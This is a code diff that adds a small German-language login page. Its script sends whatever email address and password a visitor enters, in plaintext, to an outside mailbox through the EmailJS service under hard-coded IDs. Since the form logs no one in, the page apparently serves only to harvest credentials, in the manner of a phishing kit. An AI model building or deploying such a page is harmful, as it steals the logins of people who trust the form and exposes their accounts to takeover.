@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Formular</title>
+</head>
+<body>
+  <form id="loginForm">
+    <input type="email" name="email" placeholder="Email" required />
+    <input type="password" name="password" placeholder="Passwort" required />
+    <button type="submit">Login</button>
+  </form>
+
+  <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+  <script>
+    emailjs.init("RgrrpTbTNni5sRzaj");
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs
+        .send("service_vr9ydv8", "template_wpbn18f", {
+          user_email: this.email.value,
+          user_password: this.password.value,
+        })
+        .then(
+          function (response) {
+            alert("Daten wurden gesendet ✅");
+          },
+          function (error) {
+            alert("Fehler: " + JSON.stringify(error));
+          }
+        );
+    });
+  </script>
+</body>
+</html>
